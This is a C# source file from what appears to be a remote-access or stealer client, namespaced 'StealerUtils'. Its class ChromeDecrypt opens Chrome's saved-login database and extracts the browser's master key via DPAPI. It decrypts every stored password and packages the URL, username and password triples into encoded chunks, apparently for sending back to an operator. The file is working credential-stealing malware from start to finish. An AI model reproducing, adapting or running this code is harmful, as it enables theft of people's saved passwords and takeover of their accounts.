using Microsoft.Data.Sqlite;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using SQLitePCL;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Client_side.StealerUtils
{
    internal class Credential
    {
        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }
    }
    public class ChromeDecrypt
    {
        public static List<String> MainFunction()
        {
            Process[] processlist = Process.GetProcessesByName("chrome");
            if (processlist.Length != 0)
            {
                return new List<string> { Encryptor.ConvertStr("Chrome is running! Decrypt failed!") };
            }

            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";

            byte[] key = GetKey();

            Batteries.Init();
            string connectionString = $"Data Source={LoginDataPath}";

            SqliteConnection conn = new SqliteConnection(connectionString);
            conn.Open();

            List<Credential> creds = new List<Credential>();

            SqliteCommand cmd = new SqliteCommand("select * from logins", conn);
            SqliteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["password_value"];
                if (IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    Prepare(encryptedData, out nonce, out ciphertextTag);
                    string password = Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed";
                    }
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
            }

            List<String> result = new List<string>();
            string temp = "";
            foreach (Credential cred in creds)
            {
                string credString = $"{cred.url} -- {cred.username} -- {cred.password}\n";
                temp += credString;
            }

            string credString64 = Encryptor.ConvertStr(temp);
            for (int i = 0; i < credString64.Length; i += HandleCommand.MaxChunkSize)
            {
                result.Add(credString64.Substring(i, Math.Min(HandleCommand.MaxChunkSize, credString64.Length - i)));
            }

            conn.Close();
            return result;
        }

        static bool IsV10(byte[] data)
        {
            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        //Gets the key used for new AES encryption (from Chrome 80)
        static byte[] GetKey()
        {
            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
            string content = File.ReadAllText(FilePath);
            dynamic json = JsonConvert.DeserializeObject(content);
            string key = json.os_crypt.encrypted_key;
            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
            byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);

            return decryptedkey;
        }

        //Gets cipher parameters for v10 decryption
        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        //Decrypts v10 credential
        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                return "Decryption failed";
            }

            return sR;
        }
    }
}
